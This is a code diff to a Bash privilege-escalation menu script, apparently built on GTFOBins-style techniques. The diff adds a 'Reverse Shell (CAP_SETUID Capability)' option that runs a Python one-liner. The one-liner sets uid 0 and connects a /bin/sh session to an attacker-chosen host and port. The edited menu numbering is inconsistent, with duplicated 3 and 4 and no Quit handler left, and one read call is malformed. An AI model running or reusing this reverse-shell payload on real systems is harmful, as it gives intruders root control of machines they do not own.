@@ -126,9 +126,9 @@ while true; do
     echo "Techniques : "
     echo " "
     echo "1) Shell (CAP_SETUID Capability)"
-    echo "1) Shell (Sudo)"
-    echo "1) Shell (SUID)"
-    echo "2) Reverse Shell"
+    echo "2) Shell (Sudo)"
+    echo "3) Shell (SUID)"
+    echo "4) Reverse Shell (CAP_SETUID Capability)"
     echo "3) File Read"
     echo "4) File Write"
     echo "5) Quit"
@@ -164,9 +164,33 @@ while true; do
                 esac
             done               
             ;;
-        5)
-            echo "Quit"
-            exit 0
+        4)
+            echo "----- < Reverse Shell (CAP_SETUID Capability) > -----"
+            echo " "
+            read -p "Local Host for receiving the Reverse Shell : " LHOST
+            read -p "Local Port for receiving the Reverse Shell : " LPORT
+            if [ -z "$ReverseShellCap" ]; then
+                echo "No Vulnerables Binaries with Capabilities detected"
+                continue
+            else
+                echo "$ReverseShellCap"
+            fi
+
+            select choice in $ReverseShellCap "Go Back"; do
+                case "$choice" in
+                    *python*)
+                        read "Set up your listener at $LHOST:$LPORT then press enter"
+                        "$choice" -c ''import sys,socket,os,pty;os.setuid(0);s=socket.socket();s.connect(("'$LHOST'",'$LPORT'));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")''
+                        ;;
+                    "Go Back")
+                        break
+                        ;;
+                    *)
+                        echo "Invalid Choice, Choose From : "
+                        printf '%s\n' "$ShellCap" | nl -w2 -s') '
+                        ;;
+                esac
+            done               
             ;;
         *)
             echo "Invalid Choice, Restart"
